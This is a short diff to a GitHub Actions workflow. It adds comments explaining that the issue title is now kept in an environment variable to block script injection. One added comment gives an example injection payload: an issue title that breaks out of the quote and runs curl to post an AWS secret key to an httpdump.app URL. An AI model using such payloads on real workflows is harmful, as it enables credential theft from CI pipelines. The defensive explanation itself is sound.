@@ -53,7 +53,8 @@ jobs:
 # 2. issue_title:"${{ github.event.issue.title }}"
 # 3. now it is stored in memory this is how it secures the workflow
 # 4. BEFORE IT ACTIVATED AS A SCRIPT UNDER THE RUN PIPELINE MAKEING IT EASY FOR HACKING 
-
+# 5. run same bug";curl -- request POST --data anything=$AWS_SECRET_ACCES_KEYhttps://httpdump.app/dumps/edc9c692-645a-49fc-a54d-e957f9e40663" 
+# 6. 
 
   updated-assigned-label:
     runs-on: ubuntu-latest
